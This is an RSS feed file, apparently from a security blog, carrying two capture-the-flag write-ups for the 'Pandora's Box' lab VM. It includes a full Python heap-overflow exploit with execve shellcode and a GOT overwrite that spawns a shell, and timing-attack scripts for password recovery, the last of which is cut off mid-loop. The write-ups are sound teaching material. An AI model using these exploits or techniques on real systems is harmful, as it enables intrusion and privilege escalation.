@@ -1,0 +1,644 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Pandora&#39;s box on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/pandoras-box/</link>
+    <description>Recent content in Pandora&#39;s box on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 15 Mar 2015 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/pandoras-box/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Pandora&#39;s Box: 1 - Level 1</title>
+      <link>http://rastamouse.me/writeups/2015/pandoras-box-1-level-1/</link>
+      <pubDate>Sun, 15 Mar 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/pandoras-box-1-level-1/</guid>
+      <description>
+
+&lt;p&gt;After completing &lt;a href=&#34;http://rastamouse.me/blog/2015/pandoras-box-1-level-0/&#34;&gt;Level 0&lt;/a&gt;, I echo&amp;rsquo;d my public key into &lt;code&gt;authorized_keys&lt;/code&gt; to allow for easy access.  So the first thing to do is check out level1&amp;rsquo;s home directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level1@pb0x:~$ ls -l
+
+-rwsr-xr-x 1 level2 level1 9052 Jan  4 08:58 level2
+-rw-r--r-- 1 level1 level1  145 Jan  4 09:00 level2_readme.txt
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level1@pb0x:~$ cat level2_readme.txt 
+Start this level with socat &#39;socat TCP4-listen:53121,reuseaddr,fork EXEC:./level2&#39; and use netcat or whatever to communicate with it.
+
+Have fun!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I duely ran the level2 binary with &lt;code&gt;socat&lt;/code&gt;, and connected via &lt;code&gt;netcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_1# nc 192.168.56.103 53121
+[*] Notes manager - 1.0
+[*] Type help for the command list
+&amp;gt; help
+Command list:
+     Create new note     : new
+     Set note text       : set
+     Show note text      : show
+     Delete note         : del
+     Show commands       : help
+     Exit                : exit
+&amp;gt; new
+[*] New note created with id 0
+&amp;gt; set
+&amp;gt; id: 0
+&amp;gt; text(32 max): rastamouse
+[*] Note 0 set
+&amp;gt; show
+&amp;gt; id: 0
+[*] Note 0 text: rastamouse
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So fairly obviously, this is an application which is capable of creating, recalling and removing notes.&lt;/p&gt;
+
+&lt;h2 id=&#34;some-analysis:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Some Analysis&lt;/h2&gt;
+
+&lt;p&gt;I uploaded peda and started to analyse the binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;level1@pb0x:~$ file level2
+level2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.26, BuildID[sha1]=0x6dc7e1ac89e9ffa9f40010d2823f76b6221e6448, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When a new note is created, a function called &lt;code&gt;create_struct&lt;/code&gt; is called.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ info functions 
+0x08048821  create_struct
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass main
+0x08048aea &amp;lt;+323&amp;gt;:     call   0x8048821 &amp;lt;create_struct&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This function calls &lt;code&gt;malloc&lt;/code&gt; twice.  Once at +13 which allocates 8 bytes and again at +38 which allocates 64 bytes.  These calls are setting up the structure for the notes to be stored in.  The first chunk will hold the pointer and the larger chunk for the actual content.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass create_struct
+Dump of assembler code for function create_struct:
+   0x08048821 &amp;lt;+0&amp;gt;:	push   ebp
+   0x08048822 &amp;lt;+1&amp;gt;:	mov    ebp,esp
+   0x08048824 &amp;lt;+3&amp;gt;:	sub    esp,0x28
+   0x08048827 &amp;lt;+6&amp;gt;:	mov    DWORD PTR [esp],0x8
+   0x0804882e &amp;lt;+13&amp;gt;:	call   0x80485e0 &amp;lt;malloc@plt&amp;gt;
+   0x08048833 &amp;lt;+18&amp;gt;:	mov    DWORD PTR [ebp-0xc],eax
+   0x08048836 &amp;lt;+21&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048839 &amp;lt;+24&amp;gt;:	mov    DWORD PTR [eax],0x40
+   0x0804883f &amp;lt;+30&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048842 &amp;lt;+33&amp;gt;:	mov    eax,DWORD PTR [eax]
+   0x08048844 &amp;lt;+35&amp;gt;:	mov    DWORD PTR [esp],eax
+   0x08048847 &amp;lt;+38&amp;gt;:	call   0x80485e0 &amp;lt;malloc@plt&amp;gt;
+   0x0804884c &amp;lt;+43&amp;gt;:	mov    edx,eax
+   0x0804884e &amp;lt;+45&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048851 &amp;lt;+48&amp;gt;:	mov    DWORD PTR [eax+0x4],edx
+   0x08048854 &amp;lt;+51&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x08048857 &amp;lt;+54&amp;gt;:	mov    eax,DWORD PTR [eax]
+   0x08048859 &amp;lt;+56&amp;gt;:	mov    edx,DWORD PTR [ebp-0xc]
+   0x0804885c &amp;lt;+59&amp;gt;:	mov    edx,DWORD PTR [edx+0x4]
+   0x0804885f &amp;lt;+62&amp;gt;:	and    edx,0xfffff000
+   0x08048865 &amp;lt;+68&amp;gt;:	mov    DWORD PTR [esp+0x8],0x7
+   0x0804886d &amp;lt;+76&amp;gt;:	mov    DWORD PTR [esp+0x4],eax
+   0x08048871 &amp;lt;+80&amp;gt;:	mov    DWORD PTR [esp],edx
+   0x08048874 &amp;lt;+83&amp;gt;:	call   0x8048570 &amp;lt;mprotect@plt&amp;gt;
+   0x08048879 &amp;lt;+88&amp;gt;:	mov    eax,DWORD PTR [ebp-0xc]
+   0x0804887c &amp;lt;+91&amp;gt;:	leave  
+   0x0804887d &amp;lt;+92&amp;gt;:	ret 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Interestingly, &lt;code&gt;mprotect&lt;/code&gt; is also called.  This makes part of the &lt;code&gt;heap&lt;/code&gt; executable (presumably to make this level a tiny bit easier for us?).  We can verify this, by placing a break at the &lt;code&gt;ret&lt;/code&gt; for &lt;code&gt;create_struct&lt;/code&gt; and checking the mappings with &lt;code&gt;vmmap&lt;/code&gt; before and after creating a new note.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Breakpoint 1, 0x080489b6 in main ()
+gdb-peda$ vmmap 
+Start      End        Perm     Name
+0x08048000 0x0804a000 r-xp     /home/level1/level2
+0x0804a000 0x0804b000 rw-p     /home/level1/level2
+0xb755b000 0xb755c000 rw-p     mapped
+0xb755c000 0xb7700000 r-xp     /lib/i386-linux-gnu/libc-2.15.so
+0xb7700000 0xb7701000 ---p     /lib/i386-linux-gnu/libc-2.15.so
+0xb7701000 0xb7703000 r--p     /lib/i386-linux-gnu/libc-2.15.so
+0xb7703000 0xb7704000 rw-p     /lib/i386-linux-gnu/libc-2.15.so
+0xb7704000 0xb7707000 rw-p     mapped
+0xb770b000 0xb770d000 rw-p     mapped
+0xb770d000 0xb770e000 r-xp     [vdso]
+0xb770e000 0xb772e000 r-xp     /lib/i386-linux-gnu/ld-2.15.so
+0xb772e000 0xb772f000 r--p     /lib/i386-linux-gnu/ld-2.15.so
+0xb772f000 0xb7730000 rw-p     /lib/i386-linux-gnu/ld-2.15.so
+0xbfc21000 0xbfc42000 rw-p     [stack]
+
+Breakpoint 1, 0x0804887d in create_struct ()
+0x087fe000 0x087ff000 rwxp     [heap]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;some-fuzzing:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Some Fuzzing&lt;/h2&gt;
+
+&lt;p&gt;Whilst fuzzing around locally in GDB, I found that I could force a crash.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Notes manager - 1.0
+[*] Type help for the command list
+&amp;gt; new
+[*] New note created with id 0
+&amp;gt; new
+[*] New note created with id 1
+&amp;gt; set
+&amp;gt; id: 0
+&amp;gt; text(32 max): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+[*] Note 0 set
+&amp;gt; show
+&amp;gt; id: 1
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0xb76f6ff4 --&amp;gt; 0x1a6d7c 
+ECX: 0xffffffff 
+EDX: 0x0 
+ESI: 0xb76f7a20 --&amp;gt; 0xfbad2a84 
+EDI: 0x63413563 (&#39;c5Ac&#39;)
+EBP: 0xbfaa7c08 --&amp;gt; 0xbfaa7d28 --&amp;gt; 0x0 
+ESP: 0xbfaa7650 --&amp;gt; 0xb76f7a20 --&amp;gt; 0xfbad2a84 
+EIP: 0xb7594e59 (&amp;lt;vfprintf+9081&amp;gt;:	repnz scas al,BYTE PTR es:[edi])
+
+Stopped reason: SIGSEGV
+0xb7594e59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see, EDI has been overwritten, which happened at 76 bytes.  It seems this data was the pointer for note 1 - the binary is trying to &lt;code&gt;show&lt;/code&gt; me the data which exists at &lt;code&gt;0x63413563 (&#39;c5Ac&#39;)&lt;/code&gt; which is invalid.&lt;/p&gt;
+
+&lt;p&gt;So this seems to be a potential attack vector - I can write any value in here, so that when I set/show/del note 1, I can pass my own address into the function.&lt;/p&gt;
+
+&lt;p&gt;However, I also made the discovery that I could actually leak the pointer for note 1.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Notes manager - 1.0
+[*] Type help for the command list
+&amp;gt; new
+[*] New note created with id 0
+&amp;gt; new
+[*] New note created with id 1
+&amp;gt; set
+&amp;gt; id: 0
+&amp;gt; text(32 max): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A
+[*] Note 0 set
+&amp;gt; show
+&amp;gt; id: 0
+[*] Note 0 text: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ap�&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see a few extra bytes are returned at the end of the string - they are just rendered as garbage.  I&amp;rsquo;m not sure why this happens, as I wasn&amp;rsquo;t able to find it in the debugger :(&lt;/p&gt;
+
+&lt;p&gt;But knowing the pointer for a note, I would be able to calculate the location of every other note on the heap, as they are a set &amp;lsquo;distance&amp;rsquo; from each other.  It means I can store shellcode in a note&amp;rsquo;s text portion (executable thanks to &lt;code&gt;mprotect&lt;/code&gt;) and jump there with a GOT overwrite&amp;hellip;&lt;/p&gt;
+
+&lt;h2 id=&#34;exploit:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Exploit&lt;/h2&gt;
+
+&lt;p&gt;There are a few steps to this exploit, so I wanted to step through it bit-by-bit.&lt;/p&gt;
+
+&lt;h3 id=&#34;handling-comms:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Handling comms&lt;/h3&gt;
+
+&lt;p&gt;First, I wanted to set up a function for sending and receiving data, because it&amp;rsquo;s a complete PITA to keep having to do &lt;code&gt;s.recv&lt;/code&gt; all the time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def comm(stuff, expect):
+        if not stuff == &#39;&#39;: 
+                s.send(stuff + &#39;\n&#39;)
+
+        while True:
+                r = s.recv(1024).strip()
+
+                if expect in r:
+                        break
+
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This &lt;code&gt;communicate&lt;/code&gt; function will send any data we specify and will keep receiving data until it reaches something we expect to be there.  It makes the exploit a lot cleaner, as we don&amp;rsquo;t have to &lt;code&gt;s.recv&lt;/code&gt; each line.&lt;/p&gt;
+
+&lt;p&gt;To receive the banner, all we have to do is:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;&#39;, &#39;&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;i.e. send nothing and receive data until the &lt;code&gt;&amp;gt;&lt;/code&gt; prompt is presented.&lt;/p&gt;
+
+&lt;h3 id=&#34;creating-notes:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Creating notes&lt;/h3&gt;
+
+&lt;p&gt;I&amp;rsquo;m going to use 3 notes to carry out this exploit, I tried to do it in 2 but it didn&amp;rsquo;t seem to work.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;set-note-0:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Set note 0&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;0&#39;, &#39;text&#39;)
+comm(buffer, &#39;&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;where &lt;code&gt;buffer = &#39;A&#39; * 76&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;leak-the-pointer-of-note-1:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Leak the pointer of note 1&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;show&#39;, &#39;id&#39;)
+s.send(&#39;0\n&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I have to step outside of my &lt;code&gt;comm&lt;/code&gt; function, so I can handle the data.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;data = s.recv(1024)
+address = struct.unpack(&#39;I&#39;, data[93:97])[0]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;data&lt;/code&gt; is returned like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;[*] Note 0 text: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp��
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So we extract &lt;code&gt;93:97&lt;/code&gt; which is exactly the &lt;code&gt;p��&lt;/code&gt; portion.  This is also returned as a tuple, which looks like &lt;code&gt;(153272432,)&lt;/code&gt;, so we need &lt;code&gt;[0]&lt;/code&gt; just to take the first value.&lt;/p&gt;
+
+&lt;p&gt;If we print this in hex, it will come out something like &lt;code&gt;print hex(address)&lt;/code&gt; &amp;gt;&amp;gt; &lt;code&gt;0x9e69070&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&#34;write-shellcode-into-note-2:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Write shellcode into note 2&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;2&#39;, &#39;text&#39;)
+comm(shellcode, &#39;&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;where:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;shellcode = &#39;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is &lt;code&gt;execve&lt;/code&gt; shellcode from &lt;a href=&#34;http://shell-storm.org/shellcode/files/shellcode-575.php&#34;&gt;Shellstorm&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;write-printf-into-note-1-pointer:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Write printf into note 1 pointer&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;0&#39;, &#39;text&#39;)
+comm(buffer + printf, &#39;&amp;gt;&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;where &lt;code&gt;printf = &#39;\x70\xa3\x04\x08&#39;&lt;/code&gt; from &lt;code&gt;level1@pb0x:~$ objdump -R level2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&#34;trigger-the-overwrite:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Trigger the overwrite&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;1&#39;, &#39;text&#39;)
+
+payload = p(address + 88)
+s.send(payload + &#39;\n&#39;)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks to the classic &lt;code&gt;p&lt;/code&gt; function:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def p(x):
+        return struct.pack(&#39;&amp;lt;L&#39;, x)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I also specify the additional 88 bytes here.  The leaked address is the pointer for note 1, but I am writing shellcode into note 2.  I know note 2 is 88 bytes from note 1 because of the set sizes of:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Note text = 64 bytes&lt;/li&gt;
+&lt;li&gt;Malloc chunk = 8 bytes&lt;/li&gt;
+&lt;li&gt;Length field = 4 bytes&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;handle-the-shell-commands:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Handle the shell commands&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;while True:
+        cmd = raw_input(&#39;# &#39;)
+        s.send(cmd + &#39;\n&#39;)
+        sys.stdout.write(s.recv(10240))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;putting-it-together:0c6c06b27ea44a33d384e9d33383a423&#34;&gt;Putting it together!&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import socket, struct, sys
+
+target = &#39;192.168.56.103&#39;
+port = 53121
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+def comm(stuff, expect):
+	if not stuff == &#39;&#39;:
+		s.send(stuff + &#39;\n&#39;)
+
+	while True:
+		r = s.recv(1024).strip()
+
+		if expect in r:
+			break
+
+buffer = &#39;A&#39; * 76
+printf = &#39;\x70\xa3\x04\x08&#39;
+shellcode = &#39;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&#39; 
+
+def p(x):
+	return struct.pack(&#39;&amp;lt;L&#39;, x)
+
+# Banner
+comm(&#39;&#39;, &#39;&amp;gt;&#39;)
+
+# Create notes
+comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+comm(&#39;new&#39;, &#39;&amp;gt;&#39;)
+
+# Set note 0
+comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;0&#39;, &#39;text&#39;)
+comm(buffer, &#39;&amp;gt;&#39;)
+
+# Leak note 1 address
+comm(&#39;show&#39;, &#39;id&#39;)
+s.send(&#39;0\n&#39;)
+
+# Extract address
+data = s.recv(1024)
+address = struct.unpack(&#39;I&#39;, data[93:97])[0]
+
+#Write shellcode
+comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;2&#39;, &#39;text&#39;)
+comm(shellcode, &#39;&amp;gt;&#39;)
+
+# Write printf
+comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;0&#39;, &#39;text&#39;)
+comm(buffer + printf, &#39;&amp;gt;&#39;)
+
+# GOT overwrite
+comm(&#39;set&#39;, &#39;id&#39;)
+comm(&#39;1&#39;, &#39;text&#39;)
+
+payload = p(address + 88)
+s.send(payload + &#39;\n&#39;)
+
+while True:
+	cmd = raw_input(&#39;# &#39;)
+	s.send(cmd + &#39;\n&#39;)
+	sys.stdout.write(s.recv(10240))
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_1# ./level_1.py 
+# id
+uid=1001(level1) gid=1001(level1) euid=1002(level2) groups=1002(level2),1001(level1)
+# whoami
+level2
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Pandora&#39;s Box: 1 - Level 0</title>
+      <link>http://rastamouse.me/writeups/2015/pandoras-box-1-level-0/</link>
+      <pubDate>Mon, 05 Jan 2015 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2015/pandoras-box-1-level-0/</guid>
+      <description>
+
+&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/pandoras-box-1,111/&#34;&gt;Pandora&amp;rsquo;s Box&lt;/a&gt; is a boot2root VM written by c0ne.  It focuses on binary exploitation and reverse engineering. You have to complete all 5 levels to root the box.&lt;/p&gt;
+
+&lt;p&gt;The binaries in this challenge are absolutely exquisite and extrememly well put together.  I wanted to do rather comprehensive write-up&amp;rsquo;s for each binary, which would mean a *very* long article.  For this reason, I decided to publish each level as a separate blog post.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:bb74457da9a065146c47e6672442f77c&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# nmap -n -sS -p- 192.168.56.103
+
+PORT      STATE SERVICE
+22/tcp    open  ssh
+54311/tcp open  unknown
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;secure-remote-shell:bb74457da9a065146c47e6672442f77c&#34;&gt;Secure Remote Shell&lt;/h2&gt;
+
+&lt;p&gt;The service on port &lt;code&gt;54311&lt;/code&gt; can be connected to using &lt;code&gt;netcat&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;A few passwords and some flattery didn&amp;rsquo;t get me very far.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Password: c0ne r0cks
+Invalid password!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Whilst testing for overflows, I found that long strings are split and processed.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# python -c &#39;print (&amp;quot;A&amp;quot; * 100)&#39; | nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: Invalid password!
+Password: Invalid password!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then set out to find the maximum length of the buffer, to determine the maximum theoretical length of the password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# python -c &#39;print (&amp;quot;A&amp;quot; * 62)&#39; | nc 192.168.56.103 54311
+#######################
+# Secure Remote Shell #
+#######################
+Welcome, please log in
+Password: Invalid password!
+Password:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I did write a python script that would attempt passwords from the &lt;code&gt;rockyou&lt;/code&gt; wordlist but nothing popped, and if the password was of any significant length a straight &lt;code&gt;AAAA - ZZZZ&lt;/code&gt; bruteforce would take too long.&lt;/p&gt;
+
+&lt;h2 id=&#34;time-based-attack:bb74457da9a065146c47e6672442f77c&#34;&gt;Time Based Attack&lt;/h2&gt;
+
+&lt;p&gt;If you send keystrokes manually, you can see there is a difference in the amount of *time* it takes for the binary to return &lt;code&gt;Invalid password!&lt;/code&gt;.  The longer the string, the more pronounced the difference is.&lt;/p&gt;
+
+&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/15311.js&#34; id=&#34;asciicast-15311&#34; async&gt;&lt;/script&gt;
+
+&lt;p&gt;You may need to watch it a few times to see.  But we can confirm there&amp;rsquo;s a difference by timing it in python.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import socket, time
+
+target = &#39;192.168.56.103&#39;
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+s.send(&amp;quot;A\n&amp;quot;)
+
+t0 = time.time()
+response = s.recv(512)
+prompt = s.recv(512)
+t1 = time.time()
+
+s.send(&amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&amp;quot;)
+
+t2 = time.time()
+response = s.recv(512)
+prompt = s.recv(512)
+t3 = time.time()
+
+print &amp;quot;Short: &amp;quot; + str(t1-t0)
+print &amp;quot;Long: &amp;quot; + str(t3-t2)
+
+s.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# ./level_0.py 
+Short: 0.0451579093933
+Long: 0.26290678978
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;You can see there is a significantly longer wait for the error message to be returned after sending the longer string.  We can take this a step further and time the response of a single character.&lt;/p&gt;
+
+&lt;p&gt;For just 1 run, the results were a bit hit-and-miss, so it&amp;rsquo;s better to send a character several times and work out the average response time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import socket, time, string, numpy
+
+target = &#39;192.168.56.103&#39;
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+for char in (string.ascii_letters + string.digits + string.punctuation):
+
+	t0 = time.time()
+	s.send(char + &amp;quot;\n&amp;quot;)
+	s.recv(512)
+	t1 = time.time()
+
+	t2 = time.time()
+	s.send(char + &amp;quot;\n&amp;quot;)
+	s.recv(512)
+	t3 = time.time()
+
+	t4 = time.time()
+	s.send(char + &amp;quot;\n&amp;quot;)
+	s.recv(512)
+	t5 = time.time()
+
+	t6 = time.time()
+	s.send(char + &amp;quot;\n&amp;quot;)
+	s.recv(512)
+	t7 = time.time()
+
+	times = [(t7-t6), (t5-t4), (t3-t2), (t1-t0)]
+	average = numpy.mean(times)
+
+	print char + &amp;quot;: &amp;quot; + str(average)
+
+s.close()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If this is run a few times and sorted on the 2nd column, we can easily see that the letter &lt;code&gt;R&lt;/code&gt; is consistently the quickest character to be returned.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/vulnhub/pbox/level_0# ./level_0.py | sort -s -n -k 2,2 | head -n 5
+R: 0.00170934200287
+d: 0.0026016831398
+b: 0.00287199020386
+i: 0.00288355350494
+g: 0.00291323661804
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can assume therefore, that the password begins with &lt;code&gt;R&lt;/code&gt;.  Finally, modify the script so that it will automatically move onto the next character to deciper the entire password.  We will assume that if the character reponse is quicker than &lt;code&gt;0.002s&lt;/code&gt;, then it&amp;rsquo;s valid.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+
+import socket, time, string, numpy, sys
+
+target = &#39;192.168.56.103&#39;
+port = 54311
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+
+banner = s.recv(512)
+prompt = s.recv(512)
+
+passwd = &#39;&#39;
+
+for n in range(0, 62):
+	for char in (string.ascii_letters + string.digits + string.punctuation):
+
+		t0 = time.time()
